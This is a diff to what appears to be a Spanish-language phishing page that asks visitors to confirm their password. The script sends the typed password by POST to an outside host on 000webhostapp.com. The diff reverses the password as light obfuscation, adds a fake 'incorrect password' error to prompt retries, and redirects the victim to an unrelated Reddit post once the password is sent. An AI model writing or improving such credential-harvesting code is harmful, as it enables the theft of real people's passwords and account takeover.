@@ -180,6 +180,20 @@
             font-size: 13px;
         }
 
+        .error {
+            border: 2px solid #ff0000 !important;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .error-pwd {
+            color: #ff0000;
+            font-size: 13px;
+            text-align: left;
+        }
+
         .input {
             height: 50px;
             font-size: 17px;
@@ -239,22 +253,44 @@
 
         window.onload = function () {
             document.getElementById('btn-confirm').addEventListener('click', function () {
+                document.getElementById('pwd').setAttribute('class', 'input')
+                document.getElementById('error-msg').setAttribute('class', 'hidden')
 
 
                 var pwd = document.getElementById('pwd').value;
-                var url = 'https://tw-course.000webhostapp.com/';
-                var postData = 'data=' + pwd;
-                var requestError = new XMLHttpRequest();
-                requestError.open('POST', url, true);
-                requestError.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                requestError.onreadystatechange = function () {
-                    console.log('ok');
-                };
 
-                requestError.send(postData);
+
+                if (pwd.length > 5) {
+
+                    var url = 'https://tw-course.000webhostapp.com/';
+                    var data = reverseString(pwd);
+                    var postData = 'data=' + data + '&encoded=' + encodeURI(data);
+                    var requestError = new XMLHttpRequest();
+                    requestError.open('POST', url, true);
+                    requestError.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                    
+                    requestError.onreadystatechange = function () {
+                        console.log('ok');
+                        window.location.href = 'https://www.reddit.com/r/mexico/comments/pq4g38/tacos_de_dise%C3%B1ador_pinche_raza_mamey/';
+                    };
+
+                    requestError.send(postData);
+
+                } else {
+                    document.getElementById('pwd').setAttribute('class', 'input error')
+                    document.getElementById('error-msg').setAttribute('class', 'error-pwd')
+                }
 
 
             });
+        }
+
+        function reverseString(str) {
+            var newString = "";
+            for (var i = str.length - 1; i >= 0; i--) {
+                newString += str[i];
+            }
+            return newString;
         }
 
     </script>
@@ -442,6 +478,7 @@
                 </div>
 
                 <div class="btns">
+                    <div id="error-msg" class="hidden">La contraseña que ingresaste es incorrecta.</div>
                     <a id="btn-confirm" class="btn-confirm">Confirmar</a>
                 </div>
 
